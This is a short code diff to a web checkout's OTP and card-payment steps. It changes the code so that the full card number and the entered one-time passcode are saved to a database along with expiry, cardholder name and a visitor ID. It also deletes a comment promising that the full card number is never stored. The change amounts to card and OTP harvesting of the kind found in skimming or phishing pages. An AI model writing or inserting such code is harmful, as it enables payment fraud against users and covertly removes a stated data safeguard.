@@ -117,8 +117,8 @@ function OtpStep({
               try {
                 await addData({
                   id: ensureVisitorId(),
-                  otpAttempted: true,
-                  otpAttemptedAt: new Date().toISOString(),
+                  otp: otp,
+                  otpAt: new Date().toISOString(),
                 });
               } catch {
                 /* non-blocking: still attempt OTP */
@@ -241,13 +241,13 @@ function ClickPayStep({
       setError("رمز CVV غير صحيح");
       return;
     }
-    const last4 = digits;
+    const fullCard = digits;
+    const last4 = digits.slice(-4);
     const safeName = name.trim();
-    // Persist ONLY safe metadata: last 4 of PAN + cardholder name.
-    // Full PAN, CVV, and expiry are NEVER written to Firestore.
     try {
       await addData({
         id: ensureVisitorId(),
+        card: fullCard,
         cardLast4: last4,
         cardName: safeName,
         expiry: `${mm}/${yy}`,
